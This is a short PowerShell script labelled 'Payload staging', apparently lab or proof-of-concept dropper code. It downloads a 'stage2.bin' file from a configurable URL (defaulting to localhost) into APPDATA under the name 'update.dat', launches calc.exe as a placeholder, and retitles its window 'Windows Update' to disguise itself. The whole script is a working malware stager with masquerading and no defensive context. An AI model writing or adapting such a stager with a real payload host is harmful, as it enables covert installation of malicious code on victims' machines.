
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$FetchUrl = "https://localhost:9001/cdn/stage2.bin",
    [string]$DropPath = "$env:APPDATA\update.dat"
)
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $DropPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$Host.UI.RawUI.WindowTitle = "Windows Update"
